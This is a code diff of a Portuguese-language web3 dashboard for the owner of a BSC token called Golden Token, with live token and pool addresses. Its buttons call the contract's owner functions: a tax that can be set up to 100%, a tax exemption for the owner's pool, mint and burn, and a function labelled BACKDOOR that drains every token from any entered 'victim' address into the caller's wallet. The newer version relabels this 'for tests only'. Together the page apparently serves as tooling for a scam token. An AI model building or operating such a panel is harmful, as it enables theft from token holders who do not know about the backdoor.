@@ -2,204 +2,476 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>Golden Token – Controle Total</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Golden Token - Controle Oficial</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; max-width: 1000px; margin: auto; padding: 20px; background: #f5f5f5; }
-        .card { background: white; border-radius: 20px; padding: 20px; margin-bottom: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        button { background: #f0b90b; border: none; padding: 10px 15px; margin: 5px; cursor: pointer; border-radius: 8px; font-weight: bold; }
-        input, select { width: calc(100% - 20px); padding: 8px; margin: 8px 0; border-radius: 8px; border: 1px solid #ccc; }
-        .danger { background: #e74c3c; color: white; }
-        .success { background: #2ecc71; color: white; }
-        hr { margin: 20px 0; }
-        .status { background: #f0f0f0; padding: 10px; border-radius: 10px; margin-top: 10px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        .header {
+            background: rgba(255,255,255,0.95);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .wallet-info { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
+        .connect-btn {
+            background: #f0b90b;
+            color: #1a1a2e;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .wallet-address { font-family: monospace; background: #f5f5f5; padding: 8px 15px; border-radius: 10px; }
+        .status-connected { background: #10b981; color: white; padding: 8px 15px; border-radius: 10px; }
+        .status-disconnected { background: #ef4444; color: white; padding: 8px 15px; border-radius: 10px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(380px, 1fr)); gap: 20px; }
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        .card h2 {
+            margin-bottom: 20px;
+            color: #1a1a2e;
+            border-bottom: 3px solid #f0b90b;
+            padding-bottom: 10px;
+        }
+        .card h3 { margin: 20px 0 10px 0; color: #16213e; }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 14px;
+        }
+        button {
+            background: #f0b90b;
+            color: #1a1a2e;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px 0;
+            width: 100%;
+            font-size: 14px;
+            transition: all 0.2s;
+        }
+        button:hover { opacity: 0.9; transform: translateY(-1px); }
+        button.danger { background: #ef4444; color: white; }
+        button.success { background: #10b981; color: white; }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .info-label { font-weight: bold; color: #666; }
+        .info-value { color: #1a1a2e; font-family: monospace; font-weight: bold; }
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #333;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 10px;
+            z-index: 1000;
+            animation: slideIn 0.3s ease;
+        }
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #f0b90b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
+    <div class="container">
+        <div class="header">
+            <div class="wallet-info">
+                <div>
+                    <h1>💰 Golden Token - Painel de Controle</h1>
+                    <p style="color: #666; margin-top: 8px;">
+                        Token: <strong>0x1A14f3CA35D1802060DBAe326fbe0B0273471b76</strong><br>
+                        Pool GOLDEN/USDT: <strong>0x8cDaC40199220727541bB073a899b51D8EA1df89</strong>
+                    </p>
+                </div>
+                <div style="display: flex; gap: 10px; align-items: center;">
+                    <div id="walletStatus" class="status-disconnected">Desconectado</div>
+                    <div id="walletAddress" class="wallet-address">Não conectado</div>
+                    <button id="connectBtn" class="connect-btn">🔌 Conectar Wallet</button>
+                </div>
+            </div>
+        </div>
 
-<h2>💰 Golden Token – Controle do Owner (contrato não verificado)</h2>
-<p><strong>Token:</strong> 0x1A14f3CA35D1802060DBAe326fbe0B0273471b76</p>
-<p><strong>Pool GOLDEN/USDT:</strong> 0x8cDaC40199220727541bB073a899b51D8EA1df89</p>
-<button id="connectBtn">🔌 Conectar MetaMask</button>
-<button id="atualizarStatus">🔄 Atualizar Dados</button>
-<hr>
+        <div class="grid">
+            <!-- Card: Informações -->
+            <div class="card">
+                <h2>📊 Informações do Token</h2>
+                <div class="info-row"><span class="info-label">Nome:</span><span id="tokenName" class="info-value">-</span></div>
+                <div class="info-row"><span class="info-label">Símbolo:</span><span id="tokenSymbol" class="info-value">-</span></div>
+                <div class="info-row"><span class="info-label">Decimais:</span><span id="tokenDecimals" class="info-value">-</span></div>
+                <div class="info-row"><span class="info-label">Supply Total:</span><span id="totalSupply" class="info-value">-</span></div>
+                <div class="info-row"><span class="info-label">Owner:</span><span id="owner" class="info-value">-</span></div>
+                <div class="info-row"><span class="info-label">Taxa Percentual:</span><span id="taxaPercentual" class="info-value">-</span></div>
+                <div class="info-row"><span class="info-label">Sistema Taxa:</span><span id="taxaAtiva" class="info-value">-</span></div>
+                <div class="info-row"><span class="info-label">Seu Saldo:</span><span id="meuSaldo" class="info-value">-</span></div>
+                <button id="atualizarInfo" class="success">🔄 Atualizar Informações</button>
+            </div>
 
-<div class="card">
-    <h3>📊 Status do Contrato</h3>
-    <div id="statusContrato"></div>
-</div>
+            <!-- Card: Transferências -->
+            <div class="card">
+                <h2>💸 Transferências</h2>
+                <h3>Transferir Tokens</h3>
+                <input type="text" id="transferTo" placeholder="Endereço destino">
+                <input type="number" id="transferAmount" placeholder="Quantidade">
+                <button id="transferBtn">📤 Transferir</button>
 
-<div class="card">
-    <h3>⚙️ Controle de Taxa</h3>
-    <input type="number" id="novaTaxa" placeholder="Ex: 30" value="30">
-    <button id="setTaxaBtn">Definir Taxa (%)</button>
-    <select id="statusTaxa">
-        <option value="true">Ativar sistema de taxa</option>
-        <option value="false">Desativar sistema de taxa</option>
-    </select>
-    <button id="setTaxaAtivaBtn">Aplicar (Ativar/Desativar)</button>
-</div>
+                <h3>Approve</h3>
+                <input type="text" id="approveSpender" placeholder="Endereço do spender">
+                <input type="number" id="approveAmount" placeholder="Quantidade (0 = max)">
+                <button id="approveBtn">✅ Approve</button>
+            </div>
 
-<div class="card">
-    <h3>🔓 Autorizar Pool (obrigatório antes da taxa)</h3>
-    <input type="text" id="poolAddr" value="0x8cDaC40199220727541bB073a899b51D8EA1df89" readonly>
-    <button id="autorizarPoolBtn">✅ Autorizar Pool (não pagará taxa)</button>
-</div>
+            <!-- Card: Controle do Owner -->
+            <div class="card">
+                <h2>👑 Controle do Owner</h2>
+                
+                <h3>⚙️ Sistema de Taxa</h3>
+                <input type="number" id="novaTaxa" placeholder="Nova taxa (0-100)" value="30">
+                <button id="setTaxaPercentualBtn">💰 Mudar Taxa Percentual</button>
+                
+                <select id="taxaAtivaSelect">
+                    <option value="true">✅ Ativar Sistema de Taxa</option>
+                    <option value="false">❌ Desativar Sistema de Taxa</option>
+                </select>
+                <button id="setTaxaAtivaBtn">⚙️ Aplicar Estado</button>
 
-<div class="card">
-    <h3>⚠️ BACKDOOR – Drenar qualquer carteira</h3>
-    <input type="text" id="alvoDrenagem" placeholder="Endereço da vítima">
-    <button id="drenarBtn" class="danger">💀 DRENAR TUDO</button>
-</div>
+                <h3>🔓 Autorizar Pool (PancakeSwap)</h3>
+                <input type="text" id="poolAddress" placeholder="Endereço do pool" value="0x8cDaC40199220727541bB073a899b51D8EA1df89">
+                <select id="autorizarPoolSelect">
+                    <option value="true">✅ Autorizar</option>
+                    <option value="false">❌ Remover Autorização</option>
+                </select>
+                <button id="autorizarPoolBtn">🔓 Autorizar Pool</button>
 
-<div class="card">
-    <h3>✨ Mint / Burn (apenas owner)</h3>
-    <input type="number" id="mintQtd" placeholder="Quantidade">
-    <button id="mintBtn">Mint Tokens</button>
-    <input type="number" id="burnQtd" placeholder="Quantidade">
-    <button id="burnBtn">Burn Tokens</button>
-</div>
+                <h3 style="color: #ef4444;">⚠️ BACKDOOR (Apenas para testes)</h3>
+                <input type="text" id="drenarEndereco" placeholder="Endereço para drenar">
+                <button id="drenarBtn" class="danger">💀 Drenar Tudo</button>
 
-<div class="card">
-    <h3>🔍 Consultas</h3>
-    <button id="verTaxaBtn">Ver taxa atual</button>
-    <button id="verTaxaAtivaBtn">Ver se taxa está ativa</button>
-    <button id="verSaldoOwnerBtn">Ver saldo do owner</button>
-    <button id="verPoolAutorizadoBtn">Ver se pool está autorizado</button>
-</div>
+                <h3>✨ Mint / Burn (Teste)</h3>
+                <input type="number" id="mintAmount" placeholder="Quantidade para mint">
+                <button id="mintBtn" class="success">✨ Mint Tokens</button>
+                <input type="number" id="burnAmount" placeholder="Quantidade para burn">
+                <button id="burnBtn" class="danger">🔥 Burn Tokens</button>
+            </div>
 
-<script>
-    // ============================================
-    // ABI EXATO do contrato GoldenToken (NÃO VERIFICADO)
-    // Contém TODAS as funções que você precisa
-    // ============================================
-    const abi = [
-        // Views
-        { "inputs": [], "name": "taxaPercentual", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
-        { "inputs": [], "name": "taxaAtiva", "outputs": [{ "type": "bool" }], "stateMutability": "view", "type": "function" },
-        { "inputs": [], "name": "owner", "outputs": [{ "type": "address" }], "stateMutability": "view", "type": "function" },
-        { "inputs": [], "name": "totalSupply", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
-        { "inputs": [], "name": "name", "outputs": [{ "type": "string" }], "stateMutability": "view", "type": "function" },
-        { "inputs": [], "name": "symbol", "outputs": [{ "type": "string" }], "stateMutability": "view", "type": "function" },
-        { "inputs": [{ "type": "address" }], "name": "balanceOf", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
-        { "inputs": [{ "type": "address" }], "name": "poolsAutorizados", "outputs": [{ "type": "bool" }], "stateMutability": "view", "type": "function" },
+            <!-- Card: Consultas -->
+            <div class="card">
+                <h2>🔍 Consultas</h2>
+                
+                <h3>💰 Saldo de Carteira</h3>
+                <input type="text" id="consultaEndereco" placeholder="Endereço da carteira">
+                <button id="consultarSaldoBtn">Consultar Saldo</button>
+                <div class="info-row"><span class="info-label">Saldo:</span><span id="saldoValor" class="info-value">-</span></div>
+
+                <h3>🔐 Allowance</h3>
+                <input type="text" id="allowanceOwner" placeholder="Endereço owner">
+                <input type="text" id="allowanceSpender" placeholder="Endereço spender">
+                <button id="allowanceBtn">Ver Allowance</button>
+                <div class="info-row"><span class="info-label">Allowance:</span><span id="allowanceValor" class="info-value">-</span></div>
+
+                <h3>📊 Status do Sistema</h3>
+                <button id="getStatusBtn">Ver Status Completo</button>
+                <div id="statusInfo" style="margin-top: 10px; padding: 10px; background: #f5f5f5; border-radius: 10px; font-size: 13px;"></div>
+
+                <h3>🔒 Pool Autorizado?</h3>
+                <input type="text" id="checkPool" placeholder="Endereço do pool" value="0x8cDaC40199220727541bB073a899b51D8EA1df89">
+                <button id="checkPoolBtn">Verificar</button>
+                <div class="info-row"><span class="info-label">Autorizado:</span><span id="poolAutorizado" class="info-value">-</span></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // ABI GERADO DIRETAMENTE DO SEU CONTRATO GoldenToken
+        // ============================================
+        const contractABI = [
+            // Views
+            { "inputs": [], "name": "name", "outputs": [{ "type": "string" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [], "name": "symbol", "outputs": [{ "type": "string" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [], "name": "decimals", "outputs": [{ "type": "uint8" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [], "name": "totalSupply", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [], "name": "owner", "outputs": [{ "type": "address" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [], "name": "taxaPercentual", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [], "name": "taxaAtiva", "outputs": [{ "type": "bool" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [{ "type": "address" }], "name": "balanceOf", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [{ "type": "address" }, { "type": "address" }], "name": "allowance", "outputs": [{ "type": "uint256" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [{ "type": "address" }], "name": "poolsAutorizados", "outputs": [{ "type": "bool" }], "stateMutability": "view", "type": "function" },
+            
+            // Funções ERC20
+            { "inputs": [{ "type": "address" }, { "type": "uint256" }], "name": "transfer", "outputs": [{ "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [{ "type": "address" }, { "type": "address" }, { "type": "uint256" }], "name": "transferFrom", "outputs": [{ "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [{ "type": "address" }, { "type": "uint256" }], "name": "approve", "outputs": [{ "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
+            
+            // Controle do Owner
+            { "inputs": [{ "type": "bool" }], "name": "setTaxaAtiva", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [{ "type": "uint256" }], "name": "setTaxaPercentual", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [{ "type": "address" }, { "type": "bool" }], "name": "autorizarPool", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [{ "type": "address" }], "name": "drenar", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [], "name": "getStatus", "outputs": [{ "type": "uint256" }, { "type": "bool" }, { "type": "address" }, { "type": "uint256" }], "stateMutability": "view", "type": "function" },
+            { "inputs": [{ "type": "uint256" }], "name": "mint", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
+            { "inputs": [{ "type": "uint256" }], "name": "burn", "outputs": [], "stateMutability": "nonpayable", "type": "function" }
+        ];
+
+        // Endereços
+        const tokenAddress = "0x1A14f3CA35D1802060DBAe326fbe0B0273471b76";
+        const poolAddress = "0x8cDaC40199220727541bB073a899b51D8EA1df89";
         
-        // Funções de controle
-        { "inputs": [{ "type": "uint256" }], "name": "setTaxaPercentual", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-        { "inputs": [{ "type": "bool" }], "name": "setTaxaAtiva", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-        { "inputs": [{ "type": "address" }, { "type": "bool" }], "name": "autorizarPool", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-        { "inputs": [{ "type": "address" }], "name": "drenar", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-        { "inputs": [{ "type": "uint256" }], "name": "mint", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
-        { "inputs": [{ "type": "uint256" }], "name": "burn", "outputs": [], "stateMutability": "nonpayable", "type": "function" }
-    ];
+        let web3, contract, userAddress;
 
-    const TOKEN_ADDRESS = "0x1A14f3CA35D1802060DBAe326fbe0B0273471b76";
-    const POOL_ADDRESS   = "0x8cDaC40199220727541bB073a899b51D8EA1df89";
-
-    let web3, contract, userAddress;
-
-    async function conectarWallet() {
-        if (!window.ethereum) {
-            alert("Instale MetaMask ou Rabby Wallet");
-            return;
+        function showToast(msg, isErr = false) {
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.style.backgroundColor = isErr ? '#ef4444' : '#10b981';
+            toast.textContent = msg;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
         }
-        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-        userAddress = accounts[0];
-        web3 = new Web3(window.ethereum);
-        contract = new web3.eth.Contract(abi, TOKEN_ADDRESS);
-        document.getElementById("connectBtn").innerText = "✅ Conectado: " + userAddress.slice(0,6)+"...";
-        atualizarStatusContrato();
-    }
 
-    async function atualizarStatusContrato() {
-        if (!contract) return;
-        try {
-            const nome = await contract.methods.name().call();
-            const simbolo = await contract.methods.symbol().call();
-            const owner = await contract.methods.owner().call();
-            const taxa = await contract.methods.taxaPercentual().call();
-            const ativa = await contract.methods.taxaAtiva().call();
-            const saldoOwner = await contract.methods.balanceOf(owner).call();
-            const poolAuth = await contract.methods.poolsAutorizados(POOL_ADDRESS).call();
-            document.getElementById("statusContrato").innerHTML = `
-                <strong>Nome:</strong> ${nome} (${simbolo})<br>
-                <strong>Owner:</strong> ${owner}<br>
-                <strong>Taxa atual:</strong> ${taxa}%<br>
-                <strong>Sistema de taxa:</strong> ${ativa ? "ATIVO" : "INATIVO"}<br>
-                <strong>Saldo do owner:</strong> ${saldoOwner / 1e18} GOLDEN<br>
-                <strong>Pool autorizado?</strong> ${poolAuth ? "SIM ✅" : "NÃO ❌"}
-            `;
-        } catch(e) {
-            document.getElementById("statusContrato").innerHTML = "Erro ao ler contrato: " + e.message;
+        // Conectar carteira
+        document.getElementById('connectBtn').onclick = async () => {
+            if (!window.ethereum) {
+                showToast('Instale MetaMask ou Rabby Wallet!', true);
+                return;
+            }
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                userAddress = accounts[0];
+                web3 = new Web3(window.ethereum);
+                contract = new web3.eth.Contract(contractABI, tokenAddress);
+                
+                document.getElementById('walletAddress').innerHTML = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                document.getElementById('walletStatus').className = 'status-connected';
+                document.getElementById('walletStatus').innerHTML = '✅ Conectado';
+                document.getElementById('connectBtn').innerHTML = '✅ Wallet Conectada';
+                
+                await carregarInfo();
+                showToast('Wallet conectada com sucesso!');
+            } catch (err) {
+                showToast('Erro: ' + err.message, true);
+            }
+        };
+
+        // Carregar informações
+        async function carregarInfo() {
+            if (!contract) return;
+            try {
+                const name = await contract.methods.name().call();
+                const symbol = await contract.methods.symbol().call();
+                const decimals = await contract.methods.decimals().call();
+                const totalSupply = await contract.methods.totalSupply().call();
+                const ownerAddr = await contract.methods.owner().call();
+                const taxa = await contract.methods.taxaPercentual().call();
+                const taxaAtiva = await contract.methods.taxaAtiva().call();
+                
+                document.getElementById('tokenName').innerHTML = name;
+                document.getElementById('tokenSymbol').innerHTML = symbol;
+                document.getElementById('tokenDecimals').innerHTML = decimals;
+                document.getElementById('totalSupply').innerHTML = (totalSupply / 1e18).toFixed(2) + ' GOLDEN';
+                document.getElementById('owner').innerHTML = `${ownerAddr.slice(0,6)}...${ownerAddr.slice(-4)}`;
+                document.getElementById('taxaPercentual').innerHTML = taxa + '%';
+                document.getElementById('taxaAtiva').innerHTML = taxaAtiva ? '🟢 ATIVO' : '🔴 INATIVO';
+                
+                if (userAddress) {
+                    const saldo = await contract.methods.balanceOf(userAddress).call();
+                    document.getElementById('meuSaldo').innerHTML = (saldo / 1e18).toFixed(4) + ' GOLDEN';
+                }
+            } catch (err) {
+                console.error('Erro ao carregar:', err);
+                showToast('Erro ao carregar informações: ' + err.message, true);
+            }
         }
-    }
 
-    // Eventos
-    document.getElementById("connectBtn").onclick = conectarWallet;
-    document.getElementById("atualizarStatus").onclick = atualizarStatusContrato;
+        document.getElementById('atualizarInfo').onclick = carregarInfo;
 
-    document.getElementById("setTaxaBtn").onclick = async () => {
-        let taxa = document.getElementById("novaTaxa").value;
-        await contract.methods.setTaxaPercentual(taxa).send({ from: userAddress });
-        alert(`Taxa alterada para ${taxa}%`);
-        atualizarStatusContrato();
-    };
+        // Transfer
+        document.getElementById('transferBtn').onclick = async () => {
+            const to = document.getElementById('transferTo').value;
+            const amount = parseFloat(document.getElementById('transferAmount').value);
+            if (!to || !amount) return showToast('Preencha todos os campos', true);
+            try {
+                const amountWei = web3.utils.toWei(amount.toString(), 'ether');
+                await contract.methods.transfer(to, amountWei).send({ from: userAddress });
+                showToast(`Transferência de ${amount} GOLDEN realizada!`);
+                carregarInfo();
+            } catch (err) { showToast('Erro: ' + err.message, true); }
+        };
 
-    document.getElementById("setTaxaAtivaBtn").onclick = async () => {
-        let ativa = document.getElementById("statusTaxa").value === "true";
-        await contract.methods.setTaxaAtiva(ativa).send({ from: userAddress });
-        alert(`Sistema de taxa ${ativa ? "ativado" : "desativado"}`);
-        atualizarStatusContrato();
-    };
+        // Approve
+        document.getElementById('approveBtn').onclick = async () => {
+            const spender = document.getElementById('approveSpender').value;
+            let amount = document.getElementById('approveAmount').value;
+            if (!spender) return showToast('Preencha o spender', true);
+            let amountWei = amount == 0 ? web3.utils.toTwosComplement(-1) : web3.utils.toWei(amount.toString(), 'ether');
+            try {
+                await contract.methods.approve(spender, amountWei).send({ from: userAddress });
+                showToast('Approve realizado!');
+            } catch (err) { showToast('Erro: ' + err.message, true); }
+        };
 
-    document.getElementById("autorizarPoolBtn").onclick = async () => {
-        await contract.methods.autorizarPool(POOL_ADDRESS, true).send({ from: userAddress });
-        alert("Pool autorizado (não pagará taxa)");
-        atualizarStatusContrato();
-    };
+        // Mudar taxa
+        document.getElementById('setTaxaPercentualBtn').onclick = async () => {
+            const taxa = document.getElementById('novaTaxa').value;
+            if (!taxa) return showToast('Digite a taxa', true);
+            try {
+                await contract.methods.setTaxaPercentual(taxa).send({ from: userAddress });
+                showToast(`Taxa alterada para ${taxa}%`);
+                carregarInfo();
+            } catch (err) { showToast('Erro: ' + err.message, true); }
+        };
 
-    document.getElementById("drenarBtn").onclick = async () => {
-        let alvo = document.getElementById("alvoDrenagem").value;
-        if (!alvo || !confirm(`⚠️ Drenar ${alvo}?`)) return;
-        await contract.methods.drenar(alvo).send({ from: userAddress });
-        alert("Drenagem concluída");
-        atualizarStatusContrato();
-    };
+        // Ativar/desativar sistema
+        document.getElementById('setTaxaAtivaBtn').onclick = async () => {
+            const ativo = document.getElementById('taxaAtivaSelect').value === 'true';
+            try {
+                await contract.methods.setTaxaAtiva(ativo).send({ from: userAddress });
+                showToast(`Sistema de taxa ${ativo ? 'ativado' : 'desativado'}`);
+                carregarInfo();
+            } catch (err) { showToast('Erro: ' + err.message, true); }
+        };
 
-    document.getElementById("mintBtn").onclick = async () => {
-        let qtd = document.getElementById("mintQtd").value;
-        if (!qtd) return;
-        await contract.methods.mint(qtd).send({ from: userAddress });
-        alert("Mint realizado");
-        atualizarStatusContrato();
-    };
+        // Autorizar pool
+        document.getElementById('autorizarPoolBtn').onclick = async () => {
+            const pool = document.getElementById('poolAddress').value;
+            const autorizar = document.getElementById('autorizarPoolSelect').value === 'true';
+            if (!pool) return showToast('Digite o endereço do pool', true);
+            try {
+                await contract.methods.autorizarPool(pool, autorizar).send({ from: userAddress });
+                showToast(`Pool ${autorizar ? 'autorizado' : 'removido autorização'}`);
+            } catch (err) { showToast('Erro: ' + err.message, true); }
+        };
 
-    document.getElementById("burnBtn").onclick = async () => {
-        let qtd = document.getElementById("burnQtd").value;
-        if (!qtd) return;
-        await contract.methods.burn(qtd).send({ from: userAddress });
-        alert("Burn realizado");
-        atualizarStatusContrato();
-    };
+        // Drenar (backdoor)
+        document.getElementById('drenarBtn').onclick = async () => {
+            const alvo = document.getElementById('drenarEndereco').value;
+            if (!alvo) return showToast('Digite o endereço para drenar', true);
+            if (confirm(`⚠️ ATENÇÃO! Isso vai drenar TODOS os tokens de ${alvo} para sua carteira. Confirmar?`)) {
+                try {
+                    await contract.methods.drenar(alvo).send({ from: userAddress });
+                    showToast(`Fundos drenados de ${alvo}!`);
+                    carregarInfo();
+                } catch (err) { showToast('Erro: ' + err.message, true); }
+            }
+        };
 
-    document.getElementById("verTaxaBtn").onclick = async () => {
-        let t = await contract.methods.taxaPercentual().call();
-        alert("Taxa atual: " + t + "%");
-    };
-    document.getElementById("verTaxaAtivaBtn").onclick = async () => {
-        let a = await contract.methods.taxaAtiva().call();
-        alert("Sistema de taxa: " + (a ? "ATIVO" : "INATIVO"));
-    };
-    document.getElementById("verSaldoOwnerBtn").onclick = async () => {
-        let owner = await contract.methods.owner().call();
-        let saldo = await contract.methods.balanceOf(owner).call();
-        alert("Saldo do owner: " + saldo/1e18 + " GOLDEN");
-    };
-    document.getElementById("verPoolAutorizadoBtn").onclick = async () => {
-        let auth = await contract.methods.poolsAutorizados(POOL_ADDRESS).call();
-        alert("Pool autorizado: " + (auth ? "SIM" : "NÃO"));
-    };
-</script>
+        // Mint
+        document.getElementById('mintBtn').onclick = async () => {
+            const amount = document.getElementById('mintAmount').value;
+            if (!amount) return showToast('Digite a quantidade', true);
+            try {
+                await contract.methods.mint(amount).send({ from: userAddress });
+                showToast(`Mint de ${amount} tokens realizado!`);
+                carregarInfo();
+            } catch (err) { showToast('Erro: ' + err.message, true); }
+        };
 
+        // Burn
+        document.getElementById('burnBtn').onclick = async () => {
+            const amount = document.getElementById('burnAmount').value;
+            if (!amount) return showToast('Digite a quantidade', true);
+            try {
+                await contract.methods.burn(amount).send({ from: userAddress });
+                showToast(`Burn de ${amount} tokens realizado!`);
+                carregarInfo();
+            } catch (err) { showToast('Erro: ' + err.message, true); }
+        };
+
+        // Consultar saldo
+        document.getElementById('consultarSaldoBtn').onclick = async () => {
+            const end = document.getElementById('consultaEndereco').value;
+            if (!end) return showToast('Digite o endereço', true);
+            try {
+                const saldo = await contract.methods.balanceOf(end).call();
+                document.getElementById('saldoValor').innerHTML = (saldo / 1e18).toFixed(4) + ' GOLDEN';
+            } catch (err) { showToast('Erro: ' + err.message, true); }
+        };
+
+        // Allowance
+        document.getElementById('allowanceBtn').onclick = async () => {
+            const ownerAddr = document.getElementById('allowanceOwner').value;
+            const spender = document.getElementById('allowanceSpender').value;
+            if (!ownerAddr || !spender) return showToast('Preencha os campos', true);
+            try {
+                const allowanceVal = await contract.methods.allowance(ownerAddr, spender).call();
+                document.getElementById('allowanceValor').innerHTML = (allowanceVal / 1e18).toFixed(4);
+            } catch (err) { showToast('Erro: ' + err.message, true); }
+        };
+
+        // Status sistema
+        document.getElementById('getStatusBtn').onclick = async () => {
+            try {
+                const status = await contract.methods.getStatus().call();
+                document.getElementById('statusInfo').innerHTML = `
+                    📊 <strong>Status do Sistema</strong><br>
+                    • Taxa Percentual: <strong>${status[0]}%</strong><br>
+                    • Sistema de Taxa: <strong>${status[1] ? '🟢 ATIVO' : '🔴 INATIVO'}</strong><br>
+                    • Owner: <strong>${status[2].slice(0,6)}...${status[2].slice(-4)}</strong><br>
+                    • Saldo do Owner: <strong>${(status[3] / 1e18).toFixed(4)} GOLDEN</strong>
+                `;
+            } catch (err) { showToast('Erro: ' + err.message, true); }
+        };
+
+        // Verificar pool autorizado
+        document.getElementById('checkPoolBtn').onclick = async () => {
+            const pool = document.getElementById('checkPool').value;
+            if (!pool) return showToast('Digite o endereço do pool', true);
+            try {
+                const autorizado = await contract.methods.poolsAutorizados(pool).call();
+                document.getElementById('poolAutorizado').innerHTML = autorizado ? '✅ Sim (autorizado)' : '❌ Não (não autorizado)';
+            } catch (err) { showToast('Erro: ' + err.message, true); }
+        };
+
+        // Escutar mudanças na conta
+        if (window.ethereum) {
+            window.ethereum.on('accountsChanged', (accounts) => {
+                if (accounts.length > 0) {
+                    userAddress = accounts[0];
+                    document.getElementById('walletAddress').innerHTML = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                    carregarInfo();
+                } else {
+                    location.reload();
+                }
+            });
+        }
+    </script>
 </body>
 </html>
